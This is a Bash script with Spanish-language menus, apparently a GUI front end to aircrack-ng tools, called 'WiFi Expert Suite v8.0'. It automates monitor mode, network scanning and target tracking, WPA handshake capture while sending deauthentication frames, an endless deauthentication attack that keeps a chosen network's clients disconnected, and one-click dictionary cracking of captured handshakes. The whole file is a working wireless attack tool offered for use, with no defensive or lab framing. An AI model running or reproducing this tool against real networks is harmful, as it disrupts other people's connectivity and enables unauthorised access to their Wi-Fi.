#!/bin/bash
# WiFi Expert Suite v8.0 - FULL AUTOMATIC EDITION

# --- FUNCIONES DE ALERTA ---
alerta() {
    notify-send "$1" "$2" --icon=network-wireless-hotspot
    echo -e "\a"
}

while true; do
    CHOICE=$(zenity --list --title="📡 WiFi Expert Suite v8.0 PRO" \
        --column="ID" --column="Acción" --column="Descripción" \
        --width=650 --height=550 \
        1 "⚡ MODO MONITOR" "Activa tarjeta y limpia procesos bloqueantes" \
        2 "🌐 MODO MANAGED" "Restaura Internet y NetworkManager" \
        3 "📡 ESCANEO" "Busca todas las redes cercanas" \
        4 "🔍 RASTREO" "Mira clientes conectados a una MAC" \
        5 "🔑 CAPTURAR" "Obtén el Handshake (Apretón de manos)" \
        6 "🔥 BLOQUEO TOTAL" "Ataque Infinito (Desconexión Permanente)" \
        7 "🔓 AUTO-DESCIFRAR" "Crackeo automático con un solo clic" \
        8 "❌ SALIR" "Cerrar herramienta")

    case $CHOICE in
        1) 
            sudo airmon-ng check kill
            INT=$(zenity --entry --text="Interfaz (ej: wlan0):" --entry-text="wlan0")
            sudo airmon-ng start $INT | zenity --text-info --width=400 --height=200
            alerta "MODO MONITOR" "Tarjeta lista para la acción"
            ;;
        2)
            sudo airmon-ng stop wlan0mon && sudo systemctl restart NetworkManager
            alerta "INTERNET" "Modo normal restaurado"
            ;;
        3)
            gnome-terminal --title="ESCANEO GENERAL" -- sh -c "sudo airodump-ng wlan0mon; exec bash"
            ;;
        4)
            BSSID=$(zenity --entry --text="BSSID del objetivo:")
            CANAL=$(zenity --entry --text="Canal:")
            sudo iwconfig wlan0mon channel $CANAL
            gnome-terminal --title="RASTREO: $BSSID" -- sh -c "sudo airodump-ng --bssid $BSSID -c $CANAL wlan0mon; exec bash"
            ;;
        5)
            BSSID=$(zenity --entry --text="BSSID:")
            CANAL=$(zenity --entry --text="Canal:")
            FILE="captura_$(date +%H%M)"
            sudo iwconfig wlan0mon channel $CANAL
            gnome-terminal --title="CAPTURA" -- sh -c "sudo airodump-ng --bssid $BSSID -c $CANAL -w $FILE wlan0mon; exec bash" &
            sleep 2
            xterm -T "LANZANDO DEAUTH" -e "sudo aireplay-ng -0 10 -a $BSSID wlan0mon"
            ;;
        6)
            BSSID=$(zenity --entry --text="BSSID a bloquear:")
            CANAL=$(zenity --entry --text="Canal:")
            sudo iwconfig wlan0mon channel $CANAL
            sudo aireplay-ng -0 0 -a $BSSID wlan0mon > /dev/null 2>&1 &
            PID=$!
            alerta "ATAQUE INICIADO" "Bloqueando red: $BSSID"
            ( while ps -p $PID > /dev/null; do echo "100" ; echo "# 🔥 ATACANDO: $BSSID (Presiona Cancelar para detener)" ; sleep 2; done ) | zenity --progress --title="ESTADO DEL ATAQUE" --auto-close
            if ps -p $PID > /dev/null; then sudo kill $PID 2>/dev/null; fi
            alerta "ATAQUE FINALIZADO" "Red liberada"
            ;;
        7)
            # --- LÓGICA DE UN SOLO CLIC ---
            CAP=$(ls -t *.cap 2>/dev/null | head -n 1)
            if [ -z "$CAP" ]; then
                zenity --error --text="No se encontraron capturas .cap. Ejecuta la opción 5 primero."
            else
                if [ -f "wordlist.txt" ]; then
                    gnome-terminal --title="AUTO-CRACK" -- sh -c "aircrack-ng -w wordlist.txt $CAP; echo 'Presiona Enter para salir'; read"
                else
                    DICC=$(zenity --file-selection --title="Selecciona Diccionario")
                    gnome-terminal --title="AUTO-CRACK" -- sh -c "aircrack-ng -w $DICC $CAP; read"
                fi
            fi
            ;;
        8) exit ;;
    esac
done
